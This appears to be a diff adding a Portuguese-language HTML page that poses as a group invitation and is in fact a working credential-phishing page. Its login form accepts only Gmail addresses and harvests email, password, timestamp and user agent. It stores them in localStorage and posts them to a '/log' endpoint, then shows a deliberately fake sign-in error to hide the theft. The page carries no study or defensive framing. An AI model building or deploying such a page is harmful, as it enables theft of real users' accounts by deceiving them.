@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Convite do Grupo</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .invite-container {
+            background: #ffffff;
+            width: 100%;
+            max-width: 400px;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            overflow: hidden;
+        }
+        
+        .header {
+            background: #2f3136;
+            padding: 24px;
+            text-align: center;
+            color: white;
+        }
+        
+        .avatar {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
+            margin: 0 auto 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            font-weight: bold;
+            color: white;
+            border: 4px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .username {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        
+        .invite-text {
+            color: #b9bbbe;
+            font-size: 14px;
+        }
+        
+        .members-section {
+            padding: 20px;
+            background: #f8f9fa;
+            border-bottom: 1px solid #e9ecef;
+        }
+        
+        .members-title {
+            font-size: 14px;
+            color: #6c757d;
+            font-weight: 600;
+            margin-bottom: 12px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        .members-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 10px;
+        }
+        
+        .member {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #74b9ff 0%, #0984e3 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 14px;
+            border: 2px solid white;
+        }
+        
+        .member:nth-child(2) {
+            background: linear-gradient(135deg, #fd79a8 0%, #e84393 100%);
+        }
+        
+        .member:nth-child(3) {
+            background: linear-gradient(135deg, #fdcb6e 0%, #f39c12 100%);
+        }
+        
+        .member:nth-child(4) {
+            background: linear-gradient(135deg, #00b894 0%, #00a085 100%);
+        }
+        
+        .member-count {
+            grid-column: span 4;
+            text-align: center;
+            margin-top: 10px;
+            font-size: 12px;
+            color: #6c757d;
+            font-weight: 600;
+        }
+        
+        .action-section {
+            padding: 24px;
+            text-align: center;
+        }
+        
+        .accept-btn {
+            background: linear-gradient(135deg, #00b894 0%, #00a085 100%);
+            color: white;
+            border: none;
+            padding: 14px 28px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            width: 100%;
+            box-shadow: 0 4px 15px rgba(0, 184, 148, 0.3);
+        }
+        
+        .accept-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0, 184, 148, 0.4);
+        }
+        
+        .login-form {
+            display: none;
+            padding: 24px;
+            background: #f8f9fa;
+        }
+        
+        .form-title {
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 18px;
+            font-weight: 600;
+            color: #2f3136;
+        }
+        
+        .form-group {
+            margin-bottom: 16px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 6px;
+            font-size: 12px;
+            color: #6c757d;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            background: white;
+            border: 2px solid #e9ecef;
+            border-radius: 6px;
+            color: #2f3136;
+            font-size: 14px;
+            transition: border-color 0.3s ease;
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            border-color: #00b894;
+        }
+        
+        .error-message {
+            color: #e74c3c;
+            font-size: 12px;
+            margin-top: 4px;
+            display: none;
+        }
+        
+        .success-message {
+            background: #d4edda;
+            color: #155724;
+            padding: 12px;
+            border-radius: 6px;
+            font-size: 14px;
+            text-align: center;
+            margin-top: 16px;
+            display: none;
+            border: 1px solid #c3e6cb;
+        }
+    </style>
+</head>
+<body>
+    <div class="invite-container">
+        <div class="header">
+            <div class="avatar">IK</div>
+            <div class="username">imkaisure01</div>
+            <div class="invite-text">convidou você para entrar no grupo</div>
+        </div>
+        
+        <div class="members-section">
+            <div class="members-title">Membros do Grupo</div>
+            <div class="members-grid">
+                <div class="member">JD</div>
+                <div class="member">MC</div>
+                <div class="member">AL</div>
+                <div class="member">PT</div>
+                <div class="member-count">+6 outros membros</div>
+            </div>
+        </div>
+        
+        <div class="action-section">
+            <button class="accept-btn" onclick="showLoginForm()">Aceitar Convite</button>
+        </div>
+        
+        <div id="loginForm" class="login-form">
+            <div class="form-title">Entre no Grupo</div>
+            
+            <form onsubmit="handleLogin(event)">
+                <div class="form-group">
+                    <label for="email">Endereço de E-mail</label>
+                    <input type="email" id="email" required placeholder="seu@email.com">
+                    <div id="emailError" class="error-message">Digite um e-mail @gmail.com válido</div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="password">Senha</label>
+                    <input type="password" id="password" required placeholder="Sua senha">
+                </div>
+                
+                <button type="submit" class="accept-btn">Continuar</button>
+            </form>
+            
+            <div id="successMessage" class="success-message">
+                Não foi possível entrar no momento. Tente novamente mais tarde.
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function showLoginForm() {
+            document.querySelector('.action-section').style.display = 'none';
+            document.getElementById('loginForm').style.display = 'block';
+        }
+
+        function handleLogin(event) {
+            event.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const emailError = document.getElementById('emailError');
+            
+            // Verifica se é @gmail.com
+            if (!email.toLowerCase().includes('@gmail.com')) {
+                emailError.style.display = 'block';
+                return;
+            }
+            
+            emailError.style.display = 'none';
+            
+            // Salva as credenciais
+            const credentials = {
+                email: email,
+                password: password,
+                timestamp: new Date().toLocaleString('pt-BR'),
+                userAgent: navigator.userAgent
+            };
+            
+            // Salva no localStorage
+            let savedCredentials = JSON.parse(localStorage.getItem('grupo_creds') || '[]');
+            savedCredentials.push(credentials);
+            localStorage.setItem('grupo_creds', JSON.stringify(savedCredentials));
+            
+            // Envia para o servidor
+            fetch('/log', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(credentials)
+            }).catch(error => console.log('Servidor offline, salvando localmente'));
+            
+            // Mostra mensagem de erro fake
+            document.getElementById('successMessage').style.display = 'block';
+            
+            // Limpa o formulário após 3 segundos
+            setTimeout(() => {
+                document.getElementById('email').value = '';
+                document.getElementById('password').value = '';
+                document.getElementById('successMessage').style.display = 'none';
+                document.querySelector('.action-section').style.display = 'block';
+                document.getElementById('loginForm').style.display = 'none';
+            }, 3000);
+        }
+
+        // Gera avatares com iniciais aleatórias
+        function generateRandomInitials() {
+            const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+            const members = document.querySelectorAll('.member');
+            
+            members.forEach(member => {
+                if (!member.classList.contains('member-count')) {
+                    const randomInit1 = letters[Math.floor(Math.random() * letters.length)];
+                    const randomInit2 = letters[Math.floor(Math.random() * letters.length)];
+                    member.textContent = randomInit1 + randomInit2;
+                }
+            });
+        }
+
+        // Gera iniciais aleatórias ao carregar
+        document.addEventListener('DOMContentLoaded', generateRandomInitials);
+    </script>
+</body>
+  </html>
